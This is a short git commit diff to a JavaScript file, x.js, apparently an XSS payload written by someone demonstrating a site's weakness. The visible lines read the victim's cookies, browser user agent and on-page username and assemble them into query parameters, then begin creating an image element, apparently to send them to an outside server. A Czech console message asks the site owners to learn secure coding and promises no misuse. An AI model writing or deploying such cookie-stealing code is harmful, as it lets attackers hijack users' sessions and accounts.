6f998f054633a686a6dbf3fa5b93ef1c9c9fbbe3
Testerino <honzaik@yahoo.com>
2014-04-17 01:20:40 +0200

    Update x.js

--- x.js
+++ x.js
@@ -3,7 +3,7 @@ var userAgent = navigator.userAgent;
 var username = document.getElementsByTagName("strong")[0].textContent;
 username = username.replace(/\s+/g, '');
 var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username;
-
+console.log(params);
 console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
 
 var img = document.createElement('img');
